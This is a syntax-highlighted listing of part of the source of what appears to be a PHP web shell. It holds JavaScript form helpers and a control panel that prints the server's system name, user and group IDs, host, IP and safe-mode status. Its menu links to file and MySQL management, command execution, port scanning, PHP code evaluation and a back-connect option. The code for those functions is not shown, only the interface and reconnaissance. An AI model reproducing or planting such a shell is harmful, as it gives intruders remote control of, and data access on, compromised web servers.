<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'rename'</span>).<span style="color: #f2777a; font-weight: bold;">oldname</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #f2777a; font-weight: bold;">oldname</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'rename'</span>).<span style="color: #cccccc; background-color: #2d2d2d;">submit(</span>);
}
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">dofile</span>(<span style="color: #f2777a; font-weight: bold;">doing</span>,<span style="color: #f2777a; font-weight: bold;">thefile</span>,<span style="color: #f2777a; font-weight: bold;">m</span>){
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (<span style="color: #f2777a; font-weight: bold;">m</span> &amp;&amp; !<span style="color: #cccccc; background-color: #2d2d2d;">confirm(</span><span style="color: #f2777a; font-weight: bold;">m</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span>;
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'filelist'</span>).<span style="color: #f2777a; font-weight: bold;">doing</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #f2777a; font-weight: bold;">doing</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (<span style="color: #f2777a; font-weight: bold;">thefile</span>){
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'filelist'</span>).<span style="color: #f2777a; font-weight: bold;">thefile</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #f2777a; font-weight: bold;">thefile</span>;
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'filelist'</span>).<span style="color: #cccccc; background-color: #2d2d2d;">submit(</span>);
}
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">createfile</span>(<span style="color: #f2777a; font-weight: bold;">nowpath</span>){
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">var</span> <span style="color: #f2777a; font-weight: bold;">filename</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #f2777a; font-weight: bold;">filename</span> = <span style="color: #cccccc; background-color: #2d2d2d;">prompt(</span><span style="color: #66cccc;">'Please input the file name:'</span>, <span style="color: #66cccc;">''</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (!<span style="color: #f2777a; font-weight: bold;">filename</span>) <span style="color: #99cc99;">return</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">opfile(</span><span style="color: #66cccc;">'editfile'</span>,<span style="color: #f2777a; font-weight: bold;">nowpath</span> + <span style="color: #f2777a; font-weight: bold;">filename</span>,<span style="color: #f2777a; font-weight: bold;">nowpath</span>);
}
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">opfile</span>(<span style="color: #f2777a; font-weight: bold;">action</span>,<span style="color: #f2777a; font-weight: bold;">opfile</span>,<span style="color: #f2777a; font-weight: bold;">dir</span>){
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'fileopform'</span>).<span style="color: #f2777a; font-weight: bold;">action</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #f2777a; font-weight: bold;">action</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'fileopform'</span>).<span style="color: #f2777a; font-weight: bold;">opfile</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #f2777a; font-weight: bold;">opfile</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'fileopform'</span>).<span style="color: #f2777a; font-weight: bold;">dir</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #f2777a; font-weight: bold;">dir</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'fileopform'</span>).<span style="color: #cccccc; background-color: #2d2d2d;">submit(</span>);
}
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">godir</span>(<span style="color: #f2777a; font-weight: bold;">dir</span>,<span style="color: #f2777a; font-weight: bold;">view_writable</span>){
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (<span style="color: #f2777a; font-weight: bold;">view_writable</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'godir'</span>).<span style="color: #f2777a; font-weight: bold;">view_writable</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #f2777a; font-weight: bold;">view_writable</span>;
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'godir'</span>).<span style="color: #f2777a; font-weight: bold;">dir</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #f2777a; font-weight: bold;">dir</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'godir'</span>).<span style="color: #cccccc; background-color: #2d2d2d;">submit(</span>);
}
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">getsize</span>(<span style="color: #f2777a; font-weight: bold;">getdir</span>,<span style="color: #f2777a; font-weight: bold;">dir</span>){
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'getsize'</span>).<span style="color: #f2777a; font-weight: bold;">getdir</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #f2777a; font-weight: bold;">getdir</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'getsize'</span>).<span style="color: #f2777a; font-weight: bold;">dir</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #f2777a; font-weight: bold;">dir</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'getsize'</span>).<span style="color: #cccccc; background-color: #2d2d2d;">submit(</span>);
}
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">editrecord</span>(<span style="color: #f2777a; font-weight: bold;">action</span>, <span style="color: #f2777a; font-weight: bold;">base64</span>, <span style="color: #f2777a; font-weight: bold;">tablename</span>){
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (<span style="color: #f2777a; font-weight: bold;">action</span> == <span style="color: #66cccc;">'del'</span>) {<span style="color: #f2777a; background-color: #515151;">      </span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (!<span style="color: #cccccc; background-color: #2d2d2d;">confirm(</span><span style="color: #66cccc;">'Is or isn\'t deletion record?'</span>)) <span style="color: #99cc99;">return</span>;
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'recordlist'</span>).<span style="color: #f2777a; font-weight: bold;">doing</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #f2777a; font-weight: bold;">action</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'recordlist'</span>).<span style="color: #f2777a; font-weight: bold;">base64</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #f2777a; font-weight: bold;">base64</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'recordlist'</span>).<span style="color: #f2777a; font-weight: bold;">tablename</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #f2777a; font-weight: bold;">tablename</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'recordlist'</span>).<span style="color: #cccccc; background-color: #2d2d2d;">submit(</span>);
}
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">moddbname</span>(<span style="color: #f2777a; font-weight: bold;">dbname</span>) {
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(!<span style="color: #f2777a; font-weight: bold;">dbname</span>) <span style="color: #99cc99;">return</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'setdbname'</span>).<span style="color: #f2777a; font-weight: bold;">dbname</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #f2777a; font-weight: bold;">dbname</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'setdbname'</span>).<span style="color: #cccccc; background-color: #2d2d2d;">submit(</span>);
}
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">settable</span>(<span style="color: #f2777a; font-weight: bold;">tablename</span>,<span style="color: #f2777a; font-weight: bold;">doing</span>,<span style="color: #f2777a; font-weight: bold;">page</span>) {
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(!<span style="color: #f2777a; font-weight: bold;">tablename</span>) <span style="color: #99cc99;">return</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (<span style="color: #f2777a; font-weight: bold;">doing</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'settable'</span>).<span style="color: #f2777a; font-weight: bold;">doing</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #f2777a; font-weight: bold;">doing</span>;
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (<span style="color: #f2777a; font-weight: bold;">page</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'settable'</span>).<span style="color: #f2777a; font-weight: bold;">page</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #f2777a; font-weight: bold;">page</span>;
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'settable'</span>).<span style="color: #f2777a; font-weight: bold;">tablename</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #f2777a; font-weight: bold;">tablename</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'settable'</span>).<span style="color: #cccccc; background-color: #2d2d2d;">submit(</span>);
}
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">s</span>(<span style="color: #f2777a; font-weight: bold;">action</span>,<span style="color: #f2777a; font-weight: bold;">nowpath</span>,<span style="color: #f2777a; font-weight: bold;">p1</span>,<span style="color: #f2777a; font-weight: bold;">p2</span>,<span style="color: #f2777a; font-weight: bold;">p3</span>,<span style="color: #f2777a; font-weight: bold;">p4</span>,<span style="color: #f2777a; font-weight: bold;">p5</span>) {
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(<span style="color: #f2777a; font-weight: bold;">action</span>) <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'opform'</span>).<span style="color: #f2777a; font-weight: bold;">action</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #f2777a; font-weight: bold;">action</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(<span style="color: #f2777a; font-weight: bold;">nowpath</span>) <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'opform'</span>).<span style="color: #f2777a; font-weight: bold;">nowpath</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #f2777a; font-weight: bold;">nowpath</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(<span style="color: #f2777a; font-weight: bold;">p1</span>) <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'opform'</span>).<span style="color: #f2777a; font-weight: bold;">p1</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #f2777a; font-weight: bold;">p1</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(<span style="color: #f2777a; font-weight: bold;">p2</span>) <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'opform'</span>).<span style="color: #f2777a; font-weight: bold;">p2</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #f2777a; font-weight: bold;">p2</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(<span style="color: #f2777a; font-weight: bold;">p3</span>) <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'opform'</span>).<span style="color: #f2777a; font-weight: bold;">p3</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #f2777a; font-weight: bold;">p3</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(<span style="color: #f2777a; font-weight: bold;">p4</span>) <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'opform'</span>).<span style="color: #f2777a; font-weight: bold;">p4</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #f2777a; font-weight: bold;">p4</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(<span style="color: #f2777a; font-weight: bold;">p5</span>) <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'opform'</span>).<span style="color: #f2777a; font-weight: bold;">p4</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #f2777a; font-weight: bold;">p5</span>;
}
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">g</span>(<span style="color: #f2777a; font-weight: bold;">action</span>,<span style="color: #f2777a; font-weight: bold;">nowpath</span>,<span style="color: #f2777a; font-weight: bold;">p1</span>,<span style="color: #f2777a; font-weight: bold;">p2</span>,<span style="color: #f2777a; font-weight: bold;">p3</span>,<span style="color: #f2777a; font-weight: bold;">p4</span>,<span style="color: #f2777a; font-weight: bold;">p5</span>) {
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(!<span style="color: #f2777a; font-weight: bold;">action</span>) <span style="color: #99cc99;">return</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">s(</span><span style="color: #f2777a; font-weight: bold;">action</span>,<span style="color: #f2777a; font-weight: bold;">nowpath</span>,<span style="color: #f2777a; font-weight: bold;">p1</span>,<span style="color: #f2777a; font-weight: bold;">p2</span>,<span style="color: #f2777a; font-weight: bold;">p3</span>,<span style="color: #f2777a; font-weight: bold;">p4</span>,<span style="color: #f2777a; font-weight: bold;">p5</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'opform'</span>).<span style="color: #cccccc; background-color: #2d2d2d;">submit(</span>);
}
<span style="color: #6699cc;">&lt;/script&gt;</span>
<span style="color: #6699cc;">&lt;/head&gt;</span>
<span style="color: #6699cc;">&lt;body</span> <span style="color: #6699cc;">style=</span><span style="color: #66cccc;">"margin:0;table-layout:fixed; word-break:break-all"</span><span style="color: #6699cc;">&gt;</span>
<span style="color: #cc99cc;">&lt;?php</span>
<span style="color: #cccccc; background-color: #2d2d2d;">formhead(array(</span><span style="color: #66cccc;">'name'</span>=<span style="color: #6699cc;">&gt;</span><span style="color: #66cccc;">'opform'</span>));
<span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'action'</span>, $<span style="color: #ffcc66;">action</span>);
<span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'nowpath'</span>, $<span style="color: #ffcc66;">nowpath</span>);
<span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'p1'</span>, $<span style="color: #ffcc66;">p1</span>);
<span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'p2'</span>, $<span style="color: #ffcc66;">p2</span>);
<span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'p3'</span>, $<span style="color: #ffcc66;">p3</span>);
<span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'p4'</span>, $<span style="color: #ffcc66;">p4</span>);
<span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'p5'</span>, $<span style="color: #ffcc66;">p5</span>);
<span style="color: #cccccc; background-color: #2d2d2d;">formfoot(</span>);

<span style="color: #99cc99;">if</span>(!<span style="color: #cccccc; background-color: #2d2d2d;">function_exists(</span><span style="color: #66cccc;">'posix_getegid'</span>)) {
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">user</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">get_current_user(</span>);
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">uid</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">getmyuid(</span>);
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">gid</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">getmygid(</span>);
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">group</span> = <span style="color: #66cccc;">"?"</span>;
} <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">uid</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">posix_getpwuid(</span>@<span style="color: #cccccc; background-color: #2d2d2d;">posix_geteuid(</span>));
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">gid</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">posix_getgrgid(</span>@<span style="color: #cccccc; background-color: #2d2d2d;">posix_getegid(</span>));
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">user</span> = $<span style="color: #ffcc66;">uid</span>[<span style="color: #66cccc;">'name'</span>];
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">uid</span> = $<span style="color: #ffcc66;">uid</span>[<span style="color: #66cccc;">'uid'</span>];
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">group</span> = $<span style="color: #ffcc66;">gid</span>[<span style="color: #66cccc;">'name'</span>];
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">gid</span> = $<span style="color: #ffcc66;">gid</span>[<span style="color: #66cccc;">'gid'</span>];
}

<span style="color: #cc99cc;">?&gt;</span>
<span style="color: #6699cc;">&lt;table</span> <span style="color: #6699cc;">width=</span><span style="color: #66cccc;">"100%"</span> <span style="color: #6699cc;">border=</span><span style="color: #66cccc;">"0"</span> <span style="color: #6699cc;">cellpadding=</span><span style="color: #66cccc;">"0"</span> <span style="color: #6699cc;">cellspacing=</span><span style="color: #66cccc;">"0"</span><span style="color: #6699cc;">&gt;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;tr</span> <span style="color: #6699cc;">class=</span><span style="color: #66cccc;">"head"</span><span style="color: #6699cc;">&gt;</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;td&gt;&lt;span</span> <span style="color: #6699cc;">style=</span><span style="color: #66cccc;">"float:right;"</span><span style="color: #6699cc;">&gt;</span><span style="color: #cc99cc;">&lt;?php</span> <span style="color: #99cc99;">echo</span> @<span style="color: #cccccc; background-color: #2d2d2d;">php_uname(</span>);<span style="color: #cc99cc;">?&gt;</span> / <span style="color: #f2777a; font-weight: bold;">User</span>:<span style="color: #cc99cc;">&lt;?php</span> <span style="color: #99cc99;">e</span><span style="color: #99cc99; text-decoration: underline;">cho</span><span style="text-decoration: underline;"> $</span><span style="color: #ffcc66; text-decoration: underline;">uid</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">' ( '</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">user</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">' ) / Group: '</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">gid</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">' ( '</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">group</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">' )'</span><span style="text-decoration: underline;">;</span><span style="color: #cc99cc; text-decoration: underline;">?&gt;</span><span style="color: #6699cc; text-decoration: underline;">&lt;/span&gt;</span><span style="color: #cc99cc; text-decoration: underline;">&lt;?php</span><span style="text-decoration: underline;"> </span><span style="color: #99cc99; text-decoration: underline;">echo</span><span style="text-decoration: underline;"> $</span><span style="color: #6699cc; text-decoration: underline;">_SERVER</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'HTTP_HOST'</span><span style="text-decoration: underline;">];</span><span style="color: #cc99cc; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;"> (</span><span style="color: #cc99cc; text-decoration: underline;">&lt;?php</span><span style="text-decoration: underline;"> </span><span style="color: #99cc99; text-decoration: underline;">echo</span><span style="text-decoration: underline;"> </span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">gethostbyname(</span><span style="text-decoration: underline;">$</span><span style="color: #6699cc; text-decoration: underline;">_SERVER</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'SERVER_NAME'</span><span style="text-decoration: underline;">]);</span><span style="color: #cc99cc; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;">)</span><span style="color: #6699cc; text-decoration: underline;">&lt;/td&gt;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;/tr&gt;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;tr</span> <span style="color: #6699cc;">class=</span><span style="color: #66cccc;">"alt1"</span><span style="color: #6699cc;">&gt;</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;td&gt;</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;span</span> <span style="color: #6699cc;">style=</span><span style="color: #66cccc;">"float:right;"</span><span style="color: #6699cc;">&gt;</span><span style="color: #f2777a; font-weight: bold;">PHP</span> <span style="color: #cc99cc;">&lt;?php</span> <span style="color: #99cc99;">echo</span> <span style="color: #6699cc;">PHP_VERSION</span>;<span style="color: #cc99cc;">?&gt;</span> / <span style="color: #f2777a; font-weight: bold;">Safe</span> <span style="color: #f2777a; font-weight: bold;">Mode</span><span style="text-decoration: underline;">:</span><span style="color: #cc99cc; text-decoration: underline;">&lt;?php</span><span style="text-decoration: underline;"> </span><span style="color: #99cc99; text-decoration: underline;">echo</span><span style="text-decoration: underline;"> </span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">getcfg(</span><span style="color: #66cccc; text-decoration: underline;">'safe_mode'</span><span style="text-decoration: underline;">);</span><span style="color: #cc99cc; text-decoration: underline;">?&gt;</span><span style="color: #6699cc; text-decoration: underline;">&lt;/span&gt;</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;a</span> <span style="color: #6699cc;">href=</span><span style="color: #66cccc;">"javascript:g('logout');"</span><span style="color: #6699cc;">&gt;</span><span style="color: #f2777a; font-weight: bold;">Logout</span><span style="color: #6699cc;">&lt;/a&gt;</span> |<span style="color: #f2777a; background-color: #515151;"> </span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;a</span> <span style="color: #6699cc;">href=</span><span style="color: #66cccc;">"javascript:g('file');"</span><span style="color: #6699cc;">&gt;</span><span style="color: #f2777a; font-weight: bold;">File</span> <span style="color: #f2777a; font-weight: bold;">Manager</span><span style="color: #6699cc;">&lt;/a&gt;</span> |<span style="color: #f2777a; background-color: #515151;"> </span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;a</span> <span style="color: #6699cc;">href=</span><span style="color: #66cccc;">"javascript:g('mysqladmin');"</span><span style="color: #6699cc;">&gt;</span><span style="color: #f2777a; font-weight: bold;">MYSQL</span> <span style="color: #f2777a; font-weight: bold;">Manager</span><span style="color: #6699cc;">&lt;/a&gt;</span> |<span style="color: #f2777a; background-color: #515151;"> </span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;a</span> <span style="color: #6699cc;">href=</span><span style="color: #66cccc;">"javascript:g('sqlfile');"</span><span style="color: #6699cc;">&gt;</span><span style="color: #f2777a; font-weight: bold;">MySQL</span> <span style="color: #f2777a; font-weight: bold;">Upload</span> &amp;<span style="color: #f2777a; font-weight: bold;">amp</span>; <span style="color: #f2777a; font-weight: bold;">Download</span><span style="color: #6699cc;">&lt;/a&gt;</span> |<span style="color: #f2777a; background-color: #515151; text-decoration: underline;"> </span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;a</span> <span style="color: #6699cc;">href=</span><span style="color: #66cccc;">"javascript:g('shell');"</span><span style="color: #6699cc;">&gt;</span><span style="color: #f2777a; font-weight: bold;">Execute</span> <span style="color: #f2777a; font-weight: bold;">Command</span><span style="color: #6699cc;">&lt;/a&gt;</span> |<span style="color: #f2777a; background-color: #515151;"> </span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;a</span> <span style="color: #6699cc;">href=</span><span style="color: #66cccc;">"javascript:g('phpenv');"</span><span style="color: #6699cc;">&gt;</span><span style="color: #f2777a; font-weight: bold;">PHP</span> <span style="color: #f2777a; font-weight: bold;">Variable</span><span style="color: #6699cc;">&lt;/a&gt;</span> |<span style="color: #f2777a; background-color: #515151;"> </span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;a</span> <span style="color: #6699cc;">href=</span><span style="color: #66cccc;">"javascript:g('portscan');"</span><span style="color: #6699cc;">&gt;</span><span style="color: #f2777a; font-weight: bold;">Port</span> <span style="color: #f2777a; font-weight: bold;">Scan</span><span style="color: #6699cc;">&lt;/a&gt;</span> |<span style="color: #f2777a; background-color: #515151;"> </span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;a</span> <span style="color: #6699cc;">href=</span><span style="color: #66cccc;">"javascript:g('secinfo');"</span><span style="color: #6699cc;">&gt;</span><span style="color: #f2777a; font-weight: bold;">Security</span> <span style="color: #f2777a; font-weight: bold;">information</span><span style="color: #6699cc;">&lt;/a&gt;</span> |<span style="color: #f2777a; background-color: #515151;"> </span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;a</span> <span style="color: #6699cc;">href=</span><span style="color: #66cccc;">"javascript:g('eval');"</span><span style="color: #6699cc;">&gt;</span><span style="color: #f2777a; font-weight: bold;">Eval</span> <span style="color: #f2777a; font-weight: bold;">PHP</span> <span style="color: #f2777a; font-weight: bold;">Code</span><span style="color: #6699cc;">&lt;/a&gt;</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cc99cc;">&lt;?php</span> <span style="color: #99cc99;">if</span> (!<span style="color: #f2777a; font-weight: bold;">IS_WIN</span>) {<span style="color: #cc99cc;">?&gt;</span> | <span style="color: #6699cc;">&lt;a</span> <span style="color: #6699cc;">href=</span><span style="color: #66cccc;">"javascript:g('backconnect');"</span><span style="color: #6699cc;">&gt;</span><span style="color: #f2777a; font-weight: bold;">Back</span><span style="text-decoration: underline;"> </span><span style="color: #f2777a; font-weight: bold; text-decoration: underline;">Connect</span><span style="color: #6699cc; text-decoration: underline;">&lt;/a&gt;</span><span style="color: #cc99cc; text-decoration: underline;">&lt;?php</span><span style="text-decoration: underline;"> }</span><span style="color: #cc99cc; text-decoration: underline;">?&gt;</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;/td&gt;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;/tr&gt;</span>
<span style="color: #6699cc;">&lt;/table&gt;</span>
